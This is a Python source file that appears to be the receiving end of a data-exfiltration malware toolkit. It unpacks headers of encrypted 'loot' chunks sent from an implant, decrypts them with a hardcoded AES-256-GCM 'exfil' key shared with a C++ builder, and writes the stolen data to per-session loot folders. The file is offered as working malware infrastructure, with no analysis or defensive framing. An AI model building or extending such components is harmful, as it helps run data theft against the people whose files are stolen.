import os
import hashlib
from Crypto.Cipher import AES

def decrypt_chunk(encrypted_data: bytes, key: bytes, iv: bytes, tag: bytes) -> bytes:
    """
    Decrypts a chunk using AES-256-GCM.
    Matching the BCrypt GCM implementation from Atom 05.
    """
    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
    try:
        decrypted_data = cipher.decrypt_and_verify(encrypted_data, tag)
        return decrypted_data
    except ValueError as e:
        print(f"[!] MAC verification failed for chunk! {e}")
        return None

def process_loot(session_id: str, header_bytes: bytes, encrypted_payload: bytes):
    """
    Takes the raw bytes sent from Atom 01 over the network.
    Header format (from Atom 05):
    - dwSequence: 4 bytes
    - dwChunkLen: 4 bytes
    - IV: 12 bytes
    - Tag: 16 bytes
    """
    if len(header_bytes) != 36:
        print("[!] Invalid exfil header size")
        return

    # Unpack header
    sequence = int.from_bytes(header_bytes[0:4], byteorder='little')
    chunk_len = int.from_bytes(header_bytes[4:8], byteorder='little')
    iv = header_bytes[8:20]
    tag = header_bytes[20:36]

    print(f"[*] Processing Loot Chunk Sequence: {sequence}, Size: {chunk_len}")

    # Shared AES exfil key from the C++ builder (hardcoded for MVP)
    aes_key = b"MySuperSecretAes256KeyForExfil!!"

    decrypted = decrypt_chunk(encrypted_payload, aes_key, iv, tag)
    if decrypted:
        save_dir = os.path.join(".", "loot", session_id)
        os.makedirs(save_dir, exist_ok=True)
        
        # Save chunk directly. In a real system, we'd assemble sequences.
        chunk_file = os.path.join(save_dir, f"chunk_{sequence}.bin")
        with open(chunk_file, "wb") as f:
            f.write(decrypted)
        
        # Hash integrity check
        sha256 = hashlib.sha256(decrypted).hexdigest()
        print(f"[+] Chunk {sequence} decrypted successfully. SHA256: {sha256}")
